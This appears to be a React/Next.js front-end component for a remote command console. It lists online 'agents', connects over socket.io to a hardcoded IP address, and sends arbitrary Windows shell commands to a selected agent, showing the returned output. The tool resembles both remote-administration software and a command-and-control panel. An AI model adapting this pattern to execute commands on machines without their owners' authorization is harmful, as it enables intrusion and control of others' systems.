"use client";
import { List, Tag } from "antd";
import { useEffect, useState, useMemo } from "react";
import Terminal, { ColorMode, TerminalOutput } from "react-terminal-ui";
import "./index.css";
import { jwtDecode } from "jwt-decode";
import io, { Socket } from "socket.io-client";
import React from "react";

const parseCookies = () => {
  return document.cookie.split(";").reduce((cookies: any, cookie) => {
    const [name, value] = cookie.split("=").map((c) => c.trim());
    cookies[name] = value;
    return cookies;
  }, {});
};

const cookies = parseCookies();
let userName: {
  expires: number;
  id: string;
  username: string;
} = jwtDecode(cookies.token);
const headers = {
  client: userName.username,
  token: cookies.token,
};

const useWebSocket = () => {
  const [socket, setSocket] = useState<Socket | null>(null);
  const [isConnected, setIsConnected] = useState(false);
  const [terminalLineData, setTerminalLineData] = useState<any[]>([]);
  const [directory, setDirectory] = useState("c:\\");
  const [listAgent, setListAgent] = useState<
    {
      title: string;
      time: any;
      active: boolean;
    }[]
  >([]);
  useEffect(() => {
    const newSocket = io("https://103.200.20.228/user", {
      extraHeaders: headers,
    });

    newSocket.on("connect", () => {
      setIsConnected(true);
      newSocket.emit("get_agents");
    });

    newSocket.on("disconnect", () => {
      setIsConnected(false);
    });

    newSocket.on("list_agents", (msg: any) => {
      const transformedArray: {
        title: string;
        time: string | unknown;
        active: boolean;
      }[] = Object.entries(msg).map(([key, value]) => ({
        title: key,
        time: value,
        active: false,
      }));

      const uniqueTitles = new Set();
      const resultArray = transformedArray.filter((obj) => {
        if (!uniqueTitles.has(obj.title)) {
          uniqueTitles.add(obj.title);
          return true;
        }
        return false;
      });

      setListAgent(resultArray);
    });

    newSocket.on("msg", (msg: any) => {
      const newOutput = (
        <TerminalOutput>{`${directory} ${msg.command_info.output}`}</TerminalOutput>
      );
      setTerminalLineData((prevData) => [...prevData, newOutput]);
      if (msg.command_info.dir === "") {
        setDirectory("c:\\");
      } else {
        setDirectory(msg.command_info.dir);
      }
    });

    setSocket(newSocket);

    return () => {
      newSocket.disconnect();
    };
  }, []);

  return {
    socket,
    isConnected,
    listAgent,
    terminalLineData,
    directory,
    setDirectory,
    setTerminalLineData,
    setListAgent,
  };
};

const ControlDirectly = () => {
  const {
    socket,
    isConnected,
    listAgent,
    terminalLineData,
    directory,
    setDirectory,
    setTerminalLineData,
    setListAgent,
  } = useWebSocket();
  const [clientID, setClientID] = useState("");

  const activeAgent = (index: number) => {
    const newListAgent = listAgent.map((item, i) => {
      if (i === index) {
        return { ...item, active: !item.active };
      } else {
        return { ...item, active: false };
      }
    });
    setListAgent(newListAgent);
  };

  const memoizedListAgent = useMemo(
    () =>
      listAgent.map((item, index) => (
        <MemoizedListItem
          key={item.title}
          item={item}
          index={index}
          activeAgent={activeAgent}
          setClientID={setClientID}
          setDirectory={setDirectory}
          setTerminalLineData={setTerminalLineData}
        />
      )),
    [listAgent]
  );

  return (
    <>
      {!isConnected && (
        <div className="indeterminate-progress-bar">
          <div className="indeterminate-progress-bar__progress"></div>
        </div>
      )}
      <div id="control-page" className="flex">
        <div className="w-1/4 ">
          <div
            id="scrollableDiv"
            style={{
              height: "calc(100vh - 200px)",
              overflow: "auto",
              border: "1px solid rgba(140, 140, 140, 0.35)",
            }}
          >
            <h3 className="flex ml-2 pb-2 pt-2  font-bold border-b border-gray-400">
              Agent Online <Tag color="#15AAD6">{listAgent.length}</Tag>
            </h3>
            <List
              itemLayout="horizontal"
              dataSource={memoizedListAgent}
              renderItem={(item) => item}
            />
          </div>
        </div>
        <div className="w-3/4 bg-gray-300 p-6 pt-0 pb-0">
          <Terminal
            prompt={`$ ${directory}`}
            height="calc(100vh - 100px)"
            name="Terminal"
            colorMode={ColorMode.Dark}
            onInput={(terminalInput) => {
              if (socket) {
                socket.emit("msg", {
                  from: userName.username,
                  to: clientID,
                  command_type: "cmd",
                  command_info: {
                    dir: directory,
                    cmd: terminalInput,
                  },
                });
                if (terminalInput === "clear") setTerminalLineData([]);
                else {
                  console.log(terminalInput);
                  const newTerminalLineData = [...terminalLineData];
                  newTerminalLineData.push(
                    <TerminalOutput>{`${directory} ${terminalInput}`}</TerminalOutput>
                  );
                  setTerminalLineData(newTerminalLineData);
                }
              }
            }}
          >
            {terminalLineData}
          </Terminal>
        </div>
      </div>
    </>
  );
};

const MemoizedListItem = React.memo(
  React.forwardRef(
    (
      {
        item,
        index,
        activeAgent,
        setClientID,
        setDirectory,
        setTerminalLineData,
      }: {
        item: { title: string; time: any; active: boolean };
        index: number;
        activeAgent: (index: number) => void;
        setClientID: (id: string) => void;
        setDirectory: (dir: string) => void;
        setTerminalLineData: (data: any[]) => void;
      },
      ref
    ) => (
      <List.Item
        style={{ padding: "5px" }}
        className={`cursor-pointer ${item.active ? "active" : ""}`}
        onClick={() => {
          activeAgent(index);
        }}
      >
        <List.Item.Meta
          avatar={
            <svg
              xmlns="http://www.w3.org/2000/svg"
              width="84"
              height="84"
              viewBox="0 0 84 84"
              fill="none"
            >
              <g filter="url(#filter0_d_3388_16247)">
                <path
                  d="M63.792 17.0007H19.4357C16.9904 17.0007 15 19.01 15 21.4808V52.8408C15 55.3116 16.9904 57.3208 19.4357 57.3208H34.9654C34.9188 59.1077 34.5809 61.966 33.3122 63.3157C32.8466 63.81 32.3138 64.0408 31.6337 64.0408C31.0207 64.0408 30.5247 64.5418 30.5247 65.1609C30.5247 65.7799 31.0207 66.2809 31.6337 66.2809H51.5941C52.207 66.2809 52.703 65.7799 52.703 65.1609C52.703 64.5418 52.207 64.0408 51.5941 64.0408C50.914 64.0408 50.3812 63.8111 49.9177 63.3168C48.6521 61.9738 48.312 59.1114 48.2637 57.3208H63.7922C66.2374 57.3208 68.2278 55.3117 68.2278 52.8408V21.4808C68.2277 19.01 66.2373 17.0007 63.792 17.0007ZM41.6139 55.0873C40.388 55.0873 39.3895 54.0789 39.3895 52.8407C39.3895 51.6025 40.388 50.5941 41.6139 50.5941C42.8398 50.5941 43.8382 51.6025 43.8382 52.8407C43.8382 54.0789 42.8398 55.0873 41.6139 55.0873ZM19.4357 48.3608V21.4808H63.7922L63.794 48.3608H19.4357Z"
                  fill="#717EA0"
                />
              </g>
              <defs>
                <filter
                  id="filter0_d_3388_16247"
                  x="12"
                  y="14.0007"
                  width="61.2285"
                  height="57.2802"
                  filterUnits="userSpaceOnUse"
                  color-interpolation-filters="sRGB"
                >
                  <feFlood flood-opacity="0" result="BackgroundImageFix" />
                  <feColorMatrix
                    in="SourceAlpha"
                    type="matrix"
                    values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"
                    result="hardAlpha"
                  />
                  <feOffset dx="1" dy="1" />
                  <feGaussianBlur stdDeviation="2" />
                  <feComposite in2="hardAlpha" operator="out" />
                  <feColorMatrix
                    type="matrix"
                    values="0 0 0 0 0.0121582 0 0 0 0 0.0121582 0 0 0 0 0.0121582 0 0 0 0.14 0"
                  />
                  <feBlend
                    mode="normal"
                    in2="BackgroundImageFix"
                    result="effect1_dropShadow_3388_16247"
                  />
                  <feBlend
                    mode="normal"
                    in="SourceGraphic"
                    in2="effect1_dropShadow_3388_16247"
                    result="shape"
                  />
                </filter>
              </defs>
            </svg>
          }
          title={
            <div
              className="dark:text-white cursor-pointer  "
              onClick={() => {
                setTerminalLineData([]);
                setDirectory("c:\\");
                setClientID(item.title);
              }}
            >
              <div className="font-bold">ID Agent: {item.title}</div>
              <div className="opacity-25">Time Online: {item.time}</div>
            </div>
          }
        />
      </List.Item>
    )
  )
);

MemoizedListItem.displayName = "MemoizedListItem";

export default ControlDirectly;
